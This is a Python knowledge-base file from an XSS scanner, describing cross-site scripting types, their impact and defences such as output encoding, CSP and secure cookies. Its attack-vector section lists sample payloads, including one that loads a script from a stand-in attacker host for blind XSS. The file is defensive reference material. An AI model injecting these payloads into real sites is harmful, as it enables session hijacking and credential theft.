#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Modified
Telegram: https://t.me/easyprotech

Knowledge Base: Default Fallback
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) Vulnerability",
    
    "description": """
A Cross-Site Scripting (XSS) vulnerability was detected where user-controlled input is reflected or 
stored in the application without proper sanitization. XSS remains one of the most prevalent web 
vulnerabilities (OWASP Top 10) and can lead to complete compromise of user sessions, credential theft, 
malware distribution, and defacement.

Modern XSS attacks leverage framework-specific bypasses, DOM manipulation, client-side template 
injection, and encoding techniques to bypass filters and WAFs.

SEVERITY: HIGH to CRITICAL
Depends on context and exploitability. Can lead to full account takeover.
""",

    "attack_vector": """
COMMON XSS VECTORS:

1. REFLECTED XSS
   User input in URL reflected in response
   ?search=<script>alert(1)</script>

2. STORED XSS
   Malicious data saved in database
   Comment: <img src=x onerror=alert(1)>

3. DOM-BASED XSS
   Client-side JavaScript processes untrusted data
   location.hash → innerHTML

4. MUTATION XSS (mXSS)
   HTML parsed differently by sanitizers vs browsers
   Payloads that mutate after sanitization

5. BLIND XSS
   Payload executes in admin panel or logs
   <script src=//attacker.com/blind.js></script>

6. PROTOTYPE POLLUTION
   Leading to XSS via polluted properties

7. CSS INJECTION
   Data exfiltration and UI manipulation

8. SVG-BASED XSS
   <svg onload=alert(1)>

9. TEMPLATE INJECTION
   {{constructor.constructor('alert(1)')()}}

10. POSTMESSAGE XSS
    Cross-origin messaging without validation

IMPACT:
- Session hijacking (document.cookie theft)
- Keylogging
- Credential phishing
- Cryptocurrency mining
- Ransomware delivery
- OAuth token theft
- CSRF token exfiltration
- Persistent backdoors
""",

    "remediation": """
DEFENSE STRATEGY:

1. CONTEXT-SENSITIVE OUTPUT ENCODING
   - HTML entity encoding for HTML context
   - JavaScript encoding for JS context
   - URL encoding for URL context
   - CSS encoding for CSS context

2. CONTENT SECURITY POLICY (CSP)
   Content-Security-Policy: 
     default-src 'self';
     script-src 'self' 'nonce-random' 'strict-dynamic';
     object-src 'none';
     base-uri 'none';

3. USE MODERN FRAMEWORKS
   - React (auto-escapes by default)
   - Vue (auto-escapes in templates)
   - Angular (DomSanitizer)
   BUT: Avoid dangerous APIs
   - dangerouslySetInnerHTML (React)
   - v-html (Vue)
   - bypassSecurityTrust (Angular)

4. INPUT VALIDATION
   Whitelist approach on server-side
   Reject unexpected characters/patterns

5. HTTPONLY & SECURE COOKIES
   Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict

6. SECURITY HEADERS
   - X-Content-Type-Options: nosniff
   - X-Frame-Options: DENY
   - Referrer-Policy: no-referrer

7. TRUSTED TYPES API
   Enforce at browser level (modern browsers)

8. SAMESITE COOKIES
   Prevent CSRF-based XSS

9. REGULAR SECURITY TESTING
   - Automated scanners (BRS-XSS, Burp Suite)
   - Manual penetration testing
   - Code review

10. DEVELOPER TRAINING
    Security awareness on XSS prevention

11. WAF AS ADDITIONAL LAYER
    Not primary defense

12. SUBRESOURCE INTEGRITY (SRI)
    For third-party scripts

QUICK FIXES:
- HTML: htmlspecialchars() / html.escape()
- JavaScript: JSON.stringify() / json.dumps()
- Use textContent instead of innerHTML
- Validate URLs with URL parser
- Implement CSP immediately

TOOLS:
- BRS-XSS (this scanner)
- Burp Suite Professional
- OWASP ZAP
- DOMPurify (sanitization)
- ESLint security plugins

OWASP REFERENCES:
- OWASP Top 10: A03:2021 - Injection
- CWE-79: Improper Neutralization
- OWASP XSS Prevention Cheat Sheet
- OWASP Testing Guide
"""
}
